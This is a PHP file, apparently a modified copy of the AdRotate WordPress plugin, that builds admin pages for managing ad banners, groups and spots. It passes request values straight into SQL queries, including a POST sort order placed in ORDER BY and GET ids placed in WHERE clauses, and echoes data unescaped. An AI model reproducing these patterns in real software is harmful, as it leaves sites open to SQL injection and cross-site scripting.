<?php
/*
Plugin Name: AdRotate

Description: Modified
Author: Arnan de Gans
Version: 9.4.4
*/

#---------------------------------------------------
# Load other plugin files and configuration
#---------------------------------------------------
include_once(ABSPATH.'wp-content/plugins/adrotate/adrotate-setup.php');
include_once(ABSPATH.'wp-content/plugins/adrotate/adrotate-manage.php');
include_once(ABSPATH.'wp-content/plugins/adrotate/adrotate-functions.php');
include_once(ABSPATH.'wp-content/plugins/adrotate/adrotate-widget.php');
register_activation_hook(__FILE__, 'adrotate_activate');
register_deactivation_hook(__FILE__, 'adrotate_deactivate');

adrotate_check_config();
adrotate_clean_trackerdata();

add_shortcode('adrotate', 'adrotate_shortcode');
add_action('admin_notices','adrotate_expired_banners');
add_action('admin_menu', 'adrotate_dashboard');
add_action('widgets_init', 'adrotate_widget_init_1');
add_action('widgets_init', 'adrotate_widget_init_2');
add_action('wp_dashboard_setup', 'adrotate_dashboard_widget');
add_action('wp_meta', 'adrotate_meta');

if(isset($_POST['adrotate_magic_submit'])) {
	add_action('init', 'adrotate_insert_magic');
}

if(isset($_POST['adrotate_submit'])) {
	add_action('init', 'adrotate_insert_input');
}

if(isset($_POST['adrotate_group_submit'])) {
	add_action('init', 'adrotate_insert_group');
}

if(isset($_POST['adrotate_spot_submit'])) {
	add_action('init', 'adrotate_insert_spot');
}

if(isset($_POST['adrotate_post_submit'])) {
	add_action('init', 'adrotate_insert_post');
}
if(isset($_POST['adrotate_action'])) {
	add_action('init', 'adrotate_request_action');
}

if(isset($_POST['adrotate_submit_options'])) {
	add_action('init', 'adrotate_options_submit');
}

if(isset($_POST['adrotate_uninstall'])) {
	add_action('init', 'adrotate_plugin_uninstall');
}

$adrotate_config = get_option('adrotate_config');

/*-------------------------------------------------------------
 Name:      adrotate_dashboard

 Purpose:   Add pages to admin menus
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_dashboard() {
	add_object_page('AdRotate', 'AdRotate', 'manage_options', 'adrotate', 'adrotate_manage');
		add_submenu_page('adrotate', 'AdRotate > Manage', 'Manage Banners', 'manage_options', 'adrotate', 'adrotate_manage');
		// add_submenu_page('adrotate', 'AdRotate > Banner Wizard', 'Banner Wizard', 'manage_options', 'adrotate2', 'adrotate_wizard');
		add_submenu_page('adrotate', 'AdRotate > Add/Edit (Advanced)', 'Add|Edit Banner', 'manage_options', 'adrotate3', 'adrotate_edit');
		add_submenu_page('adrotate', 'AdRotate > Groups', 'Manage Groups', 'manage_options', 'adrotate4', 'adrotate_manage_group');
		add_submenu_page('adrotate', 'AdRotate > Spots', 'Manage Spot', 'manage_options', 'adrotate6', 'adrotate_manage_spot');
		add_submenu_page('adrotate', 'AdRotate > Help', 'Help', 'manage_options', 'adrotate7', 'adrotate_help');

	add_options_page('AdRotate', 'AdRotate', 'manage_options', 'adrotate5', 'adrotate_options');
}

/*-------------------------------------------------------------
 Name:      adrotate_manage

 Purpose:   Admin management page
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_manage() {
	global $wpdb, $userdata;

	$message = $_GET['message'];
	$magic_id = $_GET['magic_id'];
	$cancel = $_GET['cancel'];
	if(isset($_POST['adrotate_order'])) { $order = $_POST['adrotate_order']; } else { $order = 'thetime ASC'; }
	if($cancel AND $magic_id > 0) adrotate_delete($magic_id, 'banner');
	?>

	<div class="wrap">
		<h2>Manage Banners</h2>

		<?php if ($message == 'deleted') { ?>
			<div id="message" class="updated fade"><p>Banner <strong>deleted</strong></p></div>
		<?php } else if ($message == 'created') { ?>
			<div id="message" class="updated fade"><p>Banner <strong>created</strong></p></div>
		<?php } else if ($message == 'reset') { ?>
			<div id="message" class="updated fade"><p>Banner(s) statistics <strong>reset</strong></p></div>
		<?php } else if ($message == 'renew') { ?>
			<div id="message" class="updated fade"><p>Banner(s) <strong>renewed</strong> for 1 more year</p></div>
		<?php } else if ($message == 'deactivate') { ?>
			<div id="message" class="updated fade"><p>Banner(s) <strong>deactivated</strong></p></div>
		<?php } else if ($message == 'activate') { ?>
			<div id="message" class="updated fade"><p>Banner(s) <strong>activated</strong></p></div>
		<?php } else if ($message == 'no_access') { ?>
			<div id="message" class="updated fade"><p>Action prohibited</p></div>
		<?php } ?>

		<form name="banners" id="post" method="post" action="admin.php?page=adrotate">
			<div class="tablenav">

				<div class="alignleft actions">
					<select name='adrotate_action' id='cat' class='postform' >
				        <option value="">Bulk Actions</option>
				        <option value="deactivate">Deactivate</option>
				        <option value="activate">Activate</option>
				        <option value="delete">Delete</option>
				        <option value="resetmultiple">Reset stats</option>
				        <option value="renewmultiple">Renew banner for 1 year</option>
					</select>
					<input type="submit" id="post-action-submit" value="Go" class="button-secondary" />
					Sort by <select name='adrotate_order' id='cat' class='postform' >
				        <option value="startshow ASC" <?php if($order == "startshow ASC") { echo 'selected'; } ?>>start date (ascending)</option>
				        <option value="startshow DESC" <?php if($order == "startshow DESC") { echo 'selected'; } ?>>start date (descending)</option>
				        <option value="endshow ASC" <?php if($order == "endshow ASC") { echo 'selected'; } ?>>end date (ascending)</option>
				        <option value="endshow DESC" <?php if($order == "endshow DESC") { echo 'selected'; } ?>>end date (descending)</option>
				        <option value="ID ASC" <?php if($order == "ID ASC") { echo 'selected'; } ?>>ID</option>
				        <option value="ID DESC" <?php if($order == "ID DESC") { echo 'selected'; } ?>>ID reversed</option>
				        <option value="title ASC" <?php if($order == "title ASC") { echo 'selected'; } ?>>title (A-Z)</option>
				        <option value="title DESC" <?php if($order == "title DESC") { echo 'selected'; } ?>>title (Z-A)</option>
				        <option value="clicks ASC" <?php if($order == "clicks ASC") { echo 'selected'; } ?>>clicks (A-Z)</option>
				        <option value="clicks DESC" <?php if($order == "clicks DESC") { echo 'selected'; } ?>>clicks (Z-A)</option>
					</select>
					<input type="submit" id="post-query-submit" value="Sort" class="button-secondary" />
				</div>

				<br class="clear" />
			</div>

		   	<table class="widefat" style="margin-top: .5em">
 			<thead>
  				<tr>
					<th scope="col" class="check-column">&nbsp;</th>
					<th scope="col" width="2%"><center>ID</center></th>
					<th scope="col" width="10%">Show from</th>
					<th scope="col" width="10%">Show until</th>
					<th scope="col" width="5%"><center>Active</center></th>
					<th scope="col" width="5%"><center>How</center></th>
					<th scope="col" width="10%">Group (ID)</th>
					<th scope="col" width="10%">Spot (ID)</th>
					<th scope="col">Title</th>
					<th scope="col" width="5%"><center>Shown</center></th>
					<th scope="col" width="5%"><center>Clicks</center></th>
					<th scope="col" width="8%"><center>CTR</center></th>
				</tr>
  			</thead>
  			<tbody>
		<?php
		if(adrotate_mysql_table_exists($wpdb->prefix.'adrotate')) {
			$now = current_time('timestamp');
			$banners = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix."adrotate` WHERE `magic` < 2 ORDER BY ".$order);
			if ($banners) {
				foreach($banners as $banner) {
					$group = $wpdb->get_row("SELECT `name` FROM `" . $wpdb->prefix . "adrotate_groups` WHERE `id` = '".$banner->group."'");
					$spot = $wpdb->get_row("SELECT `name` FROM `" . $wpdb->prefix . "adrotate_spot` WHERE `id` = '".$banner->spot."'");
					$expired = $wpdb->get_var("SELECT `id` FROM `".$wpdb->prefix."adrotate` WHERE `id` = $banner->id AND `active` = 'yes' AND `endshow` <= $now");

					if($expired == $banner->id) {
						$expiredclass = ' error';
					} else {
						$expiredclass = '';
					}

					if($class != 'alternate') {
						$class = 'alternate';
					} else {
						$class = '';
					}
					?>
				    <tr id='banner-<?php echo $banner->id; ?>' class='<?php echo $class.$expiredclass; ?>'>
						<th scope="row" class="check-column"><input type="checkbox" name="bannercheck[]" value="<?php echo $banner->id; ?>" /></th>
						<td><center><?php echo $banner->id;?></center></td>
						<td><?php echo date("F d, Y", $banner->startshow);?></td>
						<td><?php echo date("F d, Y", $banner->endshow);?></td>
						<td><center><?php if($banner->active == "yes") { echo '<img src="'.get_option('siteurl').'/wp-content/plugins/adrotate/icons/tick.png" title="Active"/>'; } else { echo '<img src="'.get_option('siteurl').'/wp-content/plugins/adrotate/icons/cross.png" title="In-active"/>'; }?></center></td>
						<?php if($banner->magic == 1) { ?>
						<td><img src="<?php echo get_option('siteurl'); ?>/wp-content/plugins/adrotate/icons/wizard.png" title="Wizard"/></td>
						<?php } else if($banner->magic == 0) { ?>
						<td><img src="<?php echo get_option('siteurl'); ?>/wp-content/plugins/adrotate/icons/manual.png" title="Manual"/></td>
						<?php } else { ?>
						<td><center>Error</center></td>
						<?php } ?>
						<td><?php echo $group->name.' ('.$banner->group.')'; ?></td>
						<td><?php echo $spot->name.' ('.$banner->spot.')';?></td>
						<td><strong><a class="row-title" href="<?php echo get_option('siteurl').'/wp-admin/admin.php?page=adrotate3&amp;edit_banner='.$banner->id;?>" title="Edit"><?php echo stripslashes(html_entity_decode($banner->title));?></a></strong></td>
						<td><center><?php echo $banner->shown;?></center></td>
						<?php if($banner->tracker == "Y") { ?>
						<td><center><?php echo $banner->clicks;?></center></td>
						<?php if($banner->shown == 0) $banner->shown = 1; ?>
						<td><center><?php echo round((100/$banner->shown)*$banner->clicks,2);?> %</center></td>
						<?php } else { ?>
						<td colspan="2"><center>N/A</center></td>
						<?php } ?>
					</tr>
	 			<?php } ?>
	 		<?php } else { ?>
				<tr id='no-id'><td scope="row" colspan="7"><em>No banners yet!</em></td></tr>
			<?php }
		} else { ?>
			<tr id='no-id'><td scope="row" colspan="7"><span style="font-weight: bold; color: #f00;">There was an error locating the main database table for AdRotate. Please deactivate and re-activate AdRotate from the plugin page!!<br />If this does not solve the issue please seek support at <a href="http://forum.at.meandmymac.net">http://forum.at.meandmymac.net</a></span></td></tr>
		<?php }	?>
			</tbody>
		</table>
		</form>

		<br class="clear" />
		<?php adrotate_credits(); ?>

	</div>
	<?php
}

/*-------------------------------------------------------------
 Name:      adrotate_edit

 Purpose:   Create new/edit banners
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_edit() {
	global $wpdb, $userdata;

	$thetime 	= current_time('timestamp');
	$message 	= $_GET['message'];
	if($_GET['edit_banner']) $banner_edit_id = $_GET['edit_banner'];
	?>

	<div class="wrap">
		<?php if(!$banner_edit_id) { ?>
		<h2>Add banner</h2>
		<?php
			$startshow = $thetime;
			$endshow = $thetime + 31536000;
		} else { ?>
		<h2>Edit banner</h2>
		<?php
			$edit_banner = $wpdb->get_row("SELECT * FROM `".$wpdb->prefix."adrotate` WHERE `id` = '$banner_edit_id'");
			$startshow = $edit_banner->startshow;
			$endshow = $edit_banner->endshow;
		}
		list($sday, $smonth, $syear) = split(" ", gmdate("d m Y", $startshow));
		list($eday, $emonth, $eyear) = split(" ", gmdate("d m Y", $endshow));

		if ($message == 'created') { ?>
			<div id="message" class="updated fade"><p>Banner <strong>created</strong> | <a href="admin.php?page=adrotate">manage banners</a></p></div>
		<?php } else if ($message == 'updated') { ?>
			<div id="message" class="updated fade"><p>Banner <strong>updated</strong> | <a href="admin.php?page=adrotate">manage banners</a></p></div>
		<?php } else if ($message == 'no_access') { ?>
			<div id="message" class="updated fade"><p>Action prohibited</p></div>
		<?php } else if ($message == 'field_error') { ?>
			<div id="message" class="updated fade"><p>Not all fields met the requirements</p></div>
		<?php } else if ($message == 'reset') { ?>
			<div id="message" class="updated fade"><p>banner statistics reset</p></div>
		<?php } else if ($message == 'renew') { ?>
			<div id="message" class="updated fade"><p>banner renewed for 1 more year</p></div>
		<?php }

		$groups = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix."adrotate_groups` ORDER BY `id`");
		$spots = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix."adrotate_spot` ORDER BY `id`");
		if($groups) { ?>
		  	<form method="post" action="admin.php?page=adrotate3">
		    	<input type="hidden" name="adrotate_username" value="<?php echo $userdata->display_name;?>" />
		    	<input type="hidden" name="adrotate_id" value="<?php echo $banner_edit_id;?>" />

		    	<table class="widefat" style="margin-top: .5em">

					<thead>
					<tr valign="top">
						<th colspan="4" bgcolor="#DDD">Create your banner, all fields are required!</th>
					</tr>
					</thead>

					<tbody>
			      	<tr>
				        <th scope="row" width="25%">Title:</th>
				        <td colspan="3"><input tabindex="1" name="adrotate_title" type="text" size="67" class="search-input" autocomplete="off" value="<?php echo $edit_banner->title;?>" /></td>
			      	</tr>
			      	<tr>
				        <th scope="row" width="25%">Code:</th>
				        <td colspan="3"><textarea tabindex="2" name="adrotate_bannercode" cols="70" rows="10"><?php echo stripslashes($edit_banner->bannercode); ?></textarea>
				        <br /><em><?php if($edit_banner->magic == 0) { ?>Options: %image%, %link%. <?php } ?>HTML/JavaScript allowed, use with care!</em></td>
			      	</tr>
			      	<tr>
					    <th scope="row">Group:</th>
				        <td>
				        <select tabindex="9" name='adrotate_group' id='cat' class='postform'>
						<?php foreach($groups as $group) {
							$class = ('alternate' != $class) ? 'alternate' : ''; ?>
						    <option value="<?php echo $group->id; ?>" <?php if($group->id == $edit_banner->group) { echo 'selected'; } ?>><?php echo $group->name; ?></option>
				    	<?php } ?>
				    	</select>
						</td>
						<th scope="row">Spot:</th>
				        <td>
				        <select tabindex="9" name='adrotate_spot' id='cat' class='postform'>
						<?php foreach($spots as $spot) {
							$class = ('alternate' != $class) ? 'alternate' : ''; ?>
						    <option value="<?php echo $spot->id; ?>" <?php if($spot->id == $edit_banner->spot) { echo 'selected'; } ?>><?php echo $spot->name; ?></option>
				    	<?php } ?>
				    	</select>
						</td>
					</tr>
					</tbody>

					<thead>
					<tr valign="top">
						<th colspan="4" bgcolor="#DDD">Advanced (Everything below is optional)</th>
					</tr>
					</thead>

					<tbody>
			      	<tr>
				        <th scope="row">Display From:</th>
				        <td>
				        	<input tabindex="3" name="adrotate_sday" class="search-input" type="text" size="4" maxlength="2" value="<?php echo $sday;?>" /> /
							<select tabindex="4" name="adrotate_smonth">
								<option value="01" <?php if($smonth == "01") { echo 'selected'; } ?>>January</option>
								<option value="02" <?php if($smonth == "02") { echo 'selected'; } ?>>February</option>
								<option value="03" <?php if($smonth == "03") { echo 'selected'; } ?>>March</option>
								<option value="04" <?php if($smonth == "04") { echo 'selected'; } ?>>April</option>
								<option value="05" <?php if($smonth == "05") { echo 'selected'; } ?>>May</option>
								<option value="06" <?php if($smonth == "06") { echo 'selected'; } ?>>June</option>
								<option value="07" <?php if($smonth == "07") { echo 'selected'; } ?>>July</option>
								<option value="08" <?php if($smonth == "08") { echo 'selected'; } ?>>August</option>
								<option value="09" <?php if($smonth == "09") { echo 'selected'; } ?>>September</option>
								<option value="10" <?php if($smonth == "10") { echo 'selected'; } ?>>October</option>
								<option value="11" <?php if($smonth == "11") { echo 'selected'; } ?>>November</option>
								<option value="12" <?php if($smonth == "12") { echo 'selected'; } ?>>December</option>
							</select> /
							<input tabindex="5" name="adrotate_syear" class="search-input" type="text" size="4" maxlength="4" value="<?php echo $syear;?>" />
				        </td>
				        <th scope="row">Until:</th>
				        <td>
				        	<input tabindex="6" name="adrotate_eday" class="search-input" type="text" size="4" maxlength="2" value="<?php echo $eday;?>"  /> /
							<select tabindex="7" name="adrotate_emonth">
								<option value="01" <?php if($emonth == "01") { echo 'selected'; } ?>>January</option>
								<option value="02" <?php if($emonth == "02") { echo 'selected'; } ?>>February</option>
								<option value="03" <?php if($emonth == "03") { echo 'selected'; } ?>>March</option>
								<option value="04" <?php if($emonth == "04") { echo 'selected'; } ?>>April</option>
								<option value="05" <?php if($emonth == "05") { echo 'selected'; } ?>>May</option>
								<option value="06" <?php if($emonth == "06") { echo 'selected'; } ?>>June</option>
								<option value="07" <?php if($emonth == "07") { echo 'selected'; } ?>>July</option>
								<option value="08" <?php if($emonth == "08") { echo 'selected'; } ?>>August</option>
								<option value="09" <?php if($emonth == "09") { echo 'selected'; } ?>>September</option>
								<option value="10" <?php if($emonth == "10") { echo 'selected'; } ?>>October</option>
								<option value="11" <?php if($emonth == "11") { echo 'selected'; } ?>>November</option>
								<option value="12" <?php if($emonth == "12") { echo 'selected'; } ?>>December</option>
							</select> /
							<input tabindex="8" name="adrotate_eyear" class="search-input" type="text" size="4" maxlength="4" value="<?php echo $eyear;?>" />
						</td>
			      	</tr>
			      	<tr>
					    <th scope="row">Max Clicks:</th>
				        <td colspan="3">Disable after <input tabindex="9" name="adrotate_maxclicks" type="text" size="5" class="search-input" autocomplete="off" value="<?php echo $edit_banner->maxclicks;?>" /> clicks! <em>Leave empty or 0 to skip this.</em></td>
					</tr>
			      	<tr>
					    <th scope="row">Max Shown:</th>
				        <td colspan="3">Disable after <input tabindex="10" name="adrotate_maxshown" type="text" size="5" class="search-input" autocomplete="off" value="<?php echo $edit_banner->maxshown;?>" /> views! <em>Leave empty or 0 to skip this.</em></td>
					</tr>
				<?php if($edit_banner->magic == 0) { ?>
			      	<tr>
				        <th scope="row">Banner image:</th>
				        <td colspan="3"><select tabindex="10" name="adrotate_image" style="min-width: 200px;">
       						<option value="none">No image or remote</option>
							<?php echo adrotate_folder_contents($edit_banner->image); ?>
						</select>
						<br /><em>Use %image% in the code. Accepted files are: jpg, jpeg, gif, png, swf and flv.</em></td>
			      	</tr>
			      	<tr>
				        <th scope="row" width="25%">Clicktracking:</th>
				        <td colspan="3">Enable? <input tabindex="11" type="checkbox" name="adrotate_tracker" <?php if($edit_banner->tracker == 'Y') { ?>checked="checked" <?php } ?> /> url: <input tabindex="12" name="adrotate_link" type="text" size="52" class="search-input" value="<?php echo $edit_banner->link;?>" />
				        <br /><em>Use %link% in the code. Do not check the box if you cannot specify an url (eg, you do not use &lt;a href="http://somelink"&gt;).</em></td>
			      	</tr>
				<?php } ?>
			      	<tr>
				        <th scope="row">Activate the banner:</th>
				        <td colspan="3"><select tabindex="13" name="adrotate_active">
						<?php if($edit_banner->active == "no") { ?>
						<option value="no">No! Do not show the banner anywhere.</option>
						<option value="yes">Yes! The banner will be shown at random intervals.</option>
						<?php } else { ?>
						<option value="yes">Yes! The banner will be shown at random intervals.</option>
						<option value="no">No! Do not show the banner anywhere.</option>
						<?php } ?>
						</select></td>
			      	</tr>
					</tbody>
				<?php if($banner_edit_id) { ?>
					<thead>
					<tr valign="top">
						<th colspan="4">Preview</th>
					</tr>
					</thead>

					<tbody>
			      	<tr>
				        <td colspan="4"><?php echo adrotate_banner($edit_banner->group, $edit_banner->spot,  $banner_edit_id, null, null, true); ?>
				        <br /><em>Note: While this preview is an accurate one, it might look different then it does on the website.
						<br />This is because of CSS differences. Your themes CSS file is not active here!</em></td>
			      	</tr>
			      	</tbody>

					<thead>
					<tr valign="top">
						<th colspan="4" bgcolor="#DDD">Statistics</th>
					</tr>
					</thead>

					<tbody>

			      	<tr>
				        <th scope="row">Added:</th>
				        <td width="25%"><?php echo date("F d Y H:i", $edit_banner->thetime); ?></td>
				        <th scope="row">Updated:</th>
				        <td width="25%"><?php echo date("F d Y H:i", $edit_banner->updated); ?></td>
			      	</tr>
			      	<tr>
				        <th scope="row">Clicked:</th>
				        <td width="25%"><?php if($edit_banner->tracker == "Y") { echo $edit_banner->clicks; } else { echo 'N/A'; } ?></td>
				        <th scope="row">Shown:</th>
				        <td width="25%"><?php echo $edit_banner->shown; ?></td>
			      	</tr>
			      	<tr>
				        <th scope="row">CTR:</th>
   						<?php if($banner->shown == 0) $edit_banner->shown = 1; ?>
				        <td width="25%"><?php if($edit_banner->tracker == "Y") { echo round((100/$edit_banner->shown)*$edit_banner->clicks,2).' %'; } else { echo 'N/A'; } ?></td>
				        <th scope="row">Actions:</th>
				        <td width="25%"><input onclick="return confirm('You are about to reset the stats for this banner!\n\n\'OK\' to continue, \'Cancel\' to stop.')" type="submit" value="Reset" name="adrotate_action" class="button-secondary delete" />
				        <input onclick="return confirm('Renew this banner for 1 more year?\n\n\'OK\' to continue, \'Cancel\' to stop.')" type="submit" value="Renew" name="adrotate_action" class="button-secondary delete" /></td>
			      	</tr>
					</tbody>
				<?php } ?>

				</table>

				<br class="clear" />
				<?php adrotate_credits(); ?>

		    	<p class="submit">
					<input tabindex="14" type="submit" name="adrotate_submit" class="button-primary" value="Save banner" />
					<a href="admin.php?page=adrotate" class="button">Cancel</a>
		    	</p>

		  	</form>
		<?php } else { ?>
		    <table class="form-table">
		    	<thead>
				<tr valign="top">
					<th>Error!</th>
				</tr>
				</thead>

				<tbody>
		      	<tr>
			        <td>You should create atleast one group before adding banners! <a href="admin.php?page=adrotate4">Add a group now</a>.</td>
		      	</tr>
		      	</tbody>
			</table>
		<?php } ?>
	</div>
<?php
}

/*-------------------------------------------------------------
 Name:      adrotate_manage_group

 Purpose:   Edit a group
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_manage_group() {
	global $wpdb, $userdata;

	$message = $_GET['message'];
	if($_GET['edit_group']) $group_edit_id = $_GET['edit_group'];
	?>

	<div class="wrap">
		<h2>Banner groups</h2>

		<?php if ($message == 'created') { ?>
			<div id="message" class="updated fade"><p>Group <strong>created</strong></p></div>
		<?php } else if ($message == 'updated') { ?>
			<div id="message" class="updated fade"><p>Group <strong>updated</strong></p></div>
		<?php } else if ($message == 'deleted') { ?>
			<div id="message" class="updated fade"><p>Group <strong>deleted</strong></p></div>
		<?php } ?>

		<?php if(!$group_edit_id) { ?>
			<form name="groups" id="post" method="post" action="admin.php?page=adrotate4">
	    	<input type="hidden" name="adrotate_action" value="group_delete" />

			<div class="tablenav">

				<div class="alignleft">
					<input onclick="return confirm('You are about to delete one or more groups!\n\nMake sure there are no banners in those groups or they will not show on the website.\n\n\'OK\' to continue, \'Cancel\' to stop.')" type="submit" value="Delete group(s)" id="post-delete-group" class="button-secondary delete" />
				</div>
			</div>

		   	<table class="widefat" style="margin-top: .5em">
	  			<thead>
	  				<tr>
						<th scope="col" class="check-column">&nbsp;</th>
						<th scope="col" width="5%"><center>ID</center></th>
						<th scope="col">Name</th>
						<th scope="col" width="10%"><center>Banners</center></th>
					</tr>
	  			</thead>
	  			<tbody>
			<?php
			if(adrotate_mysql_table_exists($wpdb->prefix.'adrotate_groups')) {
				$groups = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix . "adrotate_groups` ORDER BY `id`");
				if ($groups) {
					foreach($groups as $group) {
						$banners_in_group = $wpdb->get_var("SELECT COUNT(*) FROM `" . $wpdb->prefix . "adrotate` WHERE `group` = $group->id");
						$class = ('alternate' != $class) ? 'alternate' : ''; ?>
					    <tr id='group-<?php echo $group->id; ?>' class=' <?php echo $class; ?>'>
							<th scope="row" class="check-column"><input type="checkbox" name="groupcheck[]" value="<?php echo $group->id; ?>" /></th>
							<td><center><?php echo $group->id;?></center></td>
							<td><strong><a class="row-title" href="<?php echo get_option('siteurl').'/wp-admin/admin.php?page=adrotate4&amp;edit_group='.$group->id;?>" title="Edit"><?php echo $group->name;?></a></strong></td>
							<td><center><?php echo $banners_in_group;?></center></td>
						</tr>
		 			<?php } ?>
				<?php }
			} else { ?>
				<tr id='no-id'><td scope="row" colspan="4"><span style="font-weight: bold; color: #f00;">There was an error locating the database table for the AdRotate groups. Please deactivate and re-activate AdRotate from the plugin page!!<br />If this does not solve the issue please seek support at <a href="http://forum.at.meandmymac.net">http://forum.at.meandmymac.net</a></span></td></tr>
			<?php }	?>
				    <tr id='group-new'>
						<th scope="row" class="check-column">&nbsp;</th>
						<td colspan="3"><input name="adrotate_group" type="text" class="search-input" size="40" value="" autocomplete="off" /> <input type="submit" id="post-query-submit" name="adrotate_group_submit" value="Add" class="button-secondary" /></td>
					</tr>
	 			</tbody>
			</table>
			</form>

			<br class="clear" />
			<?php adrotate_credits(); ?>

		<?php } else { ?>

			<?php
			$edit_group = $wpdb->get_row("SELECT * FROM `".$wpdb->prefix."adrotate_groups` WHERE `id` = '$group_edit_id'");

			if ($message == 'field_error') { ?>
				<div id="message" class="updated fade"><p>Please fill in a name for your group!</p></div>
			<?php }

			if($group_edit_id > 0) { ?>
			  	<form method="post" action="admin.php?page=adrotate4">
			    	<input type="hidden" name="adrotate_id" value="<?php echo $group_edit_id;?>" />

			    	<table class="widefat" style="margin-top: .5em">

						<thead>
						<tr valign="top">
							<th colspan="2" bgcolor="#DDD">You can change the name of the group here. The ID stays the same!</th>
						</tr>
						</thead>

						<tbody>
				      	<tr>
					        <th scope="row" width="25%">ID:</th>
					        <td><?php echo $edit_group->id;?></td>
				      	</tr>
				      	<tr>
					        <th scope="row" width="25%">Name:</th>
					        <td><input tabindex="1" name="adrotate_group" type="text" size="67" class="search-input" autocomplete="off" value="<?php echo $edit_group->name;?>" /></td>
				      	</tr>
				      	</tbody>

					</table>

			    	<p class="submit">
						<input tabindex="2" type="submit" name="adrotate_group_submit" class="button-primary" value="Save Group" />
						<a href="admin.php?page=adrotate4" class="button">Cancel</a>
			    	</p>

			  	</form>
			<?php } else { ?>
			    <table class="widefat" style="margin-top: .5em">
			    	<thead>
					<tr valign="top">
						<th>Error!</th>
					</tr>
					</thead>

					<tbody>
			      	<tr>
				        <td>No valid group ID specified! <a href="admin.php?page=adrotate4">Continue</a>.</td>
			      	</tr>
			      	</tbody>
				</table>
			<?php } ?>
		<?php } ?>
	</div>
<?php
}


/*-------------------------------------------------------------
 Name:      adrotate_manage_spot

 Purpose:   Edit a spot
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_manage_spot() {
	global $wpdb, $userdata;

	$message = $_GET['message'];
	if($_GET['edit_spot']) $spot_edit_id = $_GET['edit_spot'];
	?>

	<div class="wrap">
		<h2>Banner Spots</h2>

		<?php if ($message == 'created') { ?>
			<div id="message" class="updated fade"><p>Spot <strong>created</strong></p></div>
		<?php } else if ($message == 'updated') { ?>
			<div id="message" class="updated fade"><p>Spot <strong>updated</strong></p></div>
		<?php } else if ($message == 'deleted') { ?>
			<div id="message" class="updated fade"><p>Spot <strong>deleted</strong></p></div>
		<?php } ?>

		<?php if(!$spot_edit_id) { ?>
			<form name="spots" id="post" method="post" action="admin.php?page=adrotate6">
	    	<input type="hidden" name="adrotate_action" value="spot_delete" />

			<div class="tablenav">

				<div class="alignleft">
					<input onclick="return confirm('You are about to delete one or more spots!\n\nMake sure there are no banners in those spots or they will not show on the website.\n\n\'OK\' to continue, \'Cancel\' to stop.')" type="submit" value="Delete spot(s)" id="post-delete-spot" class="button-secondary delete" />
				</div>
			</div>

		   	<table class="widefat" style="margin-top: .5em">
	  			<thead>
	  				<tr>
						<th scope="col" class="check-column">&nbsp;</th>
						<th scope="col" width="5%"><center>ID</center></th>
						<th scope="col">Name</th>
						<th scope="col" width="10%"><center>Banners</center></th>
					</tr>
	  			</thead>
	  			<tbody>
			<?php
			if(adrotate_mysql_table_exists($wpdb->prefix.'adrotate_spot')) {
				$spots = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix . "adrotate_spot` ORDER BY `id`");
				if ($spots) {
					foreach($spots as $spot) {
						$banners_in_spot = $wpdb->get_var("SELECT COUNT(*) FROM `" . $wpdb->prefix . "adrotate` WHERE `spot` = $spot->id");
						$class = ('alternate' != $class) ? 'alternate' : ''; ?>
					    <tr id='spot-<?php echo $spot->id; ?>' class=' <?php echo $class; ?>'>
							<th scope="row" class="check-column"><input type="checkbox" name="spotcheck[]" value="<?php echo $spot->id; ?>" /></th>
							<td><center><?php echo $spot->id;?></center></td>
							<td><strong><a class="row-title" href="<?php echo get_option('siteurl').'/wp-admin/admin.php?page=adrotate6&amp;edit_spot='.$spot->id;?>" title="Edit"><?php echo $spot->name;?></a></strong></td>
							<td><center><?php echo $banners_in_spot;?></center></td>
						</tr>
		 			<?php } ?>
				<?php }
			} else { ?>
				<tr id='no-id'><td scope="row" colspan="4"><span style="font-weight: bold; color: #f00;">There was an error locating the database table for the AdRotate spots. Please deactivate and re-activate AdRotate from the plugin page!!<br />If this does not solve the issue please seek support at <a href="http://forum.at.meandmymac.net">http://forum.at.meandmymac.net</a></span></td></tr>
			<?php }	?>
				    <tr id='spot-new'>
						<th scope="row" class="check-column">&nbsp;</th>
						<td colspan="3"><input name="adrotate_spot" type="text" class="search-input" size="40" value="" autocomplete="off" /> <input type="submit" id="post-query-submit" name="adrotate_spot_submit" value="Add" class="button-secondary" /></td>
					</tr>
	 			</tbody>
			</table>
			</form>

			<br class="clear" />
			<?php adrotate_credits(); ?>

		<?php } else { ?>

			<?php
			$edit_spot = $wpdb->get_row("SELECT * FROM `".$wpdb->prefix."adrotate_spot` WHERE `id` = '$spot_edit_id'");

			if ($message == 'field_error') { ?>
				<div id="message" class="updated fade"><p>Please fill in a name for your spot!</p></div>
			<?php }

			if($spot_edit_id > 0) { ?>
			  	<form method="post" action="admin.php?page=adrotate6">
			    	<input type="hidden" name="adrotate_id" value="<?php echo $spot_edit_id;?>" />

			    	<table class="widefat" style="margin-top: .5em">

						<thead>
						<tr valign="top">
							<th colspan="2" bgcolor="#DDD">You can change the name of the spot here. The ID stays the same!</th>
						</tr>
						</thead>

						<tbody>
				      	<tr>
					        <th scope="row" width="25%">ID:</th>
					        <td><?php echo $edit_spot->id;?></td>
				      	</tr>
				      	<tr>
					        <th scope="row" width="25%">Name:</th>
					        <td><input tabindex="1" name="adrotate_spot" type="text" size="67" class="search-input" autocomplete="off" value="<?php echo $edit_spot->name;?>" /></td>
				      	</tr>
				      	</tbody>

					</table>

			    	<p class="submit">
						<input tabindex="2" type="submit" name="adrotate_spot_submit" class="button-primary" value="Save Spot" />
						<a href="admin.php?page=adrotate6" class="button">Cancel</a>
			    	</p>

			  	</form>
			<?php } else { ?>
			    <table class="widefat" style="margin-top: .5em">
			    	<thead>
					<tr valign="top">
						<th>Error!</th>
					</tr>
					</thead>

					<tbody>
			      	<tr>
				        <td>No valid spot ID specified! <a href="admin.php?page=adrotate6">Continue</a>.</td>
			      	</tr>
			      	</tbody>
				</table>
			<?php } ?>
		<?php } ?>
	</div>
<?php
}


/*-------------------------------------------------------------
 Name:      adrotate_wizard

 Purpose:   Create new banners, the idiot way
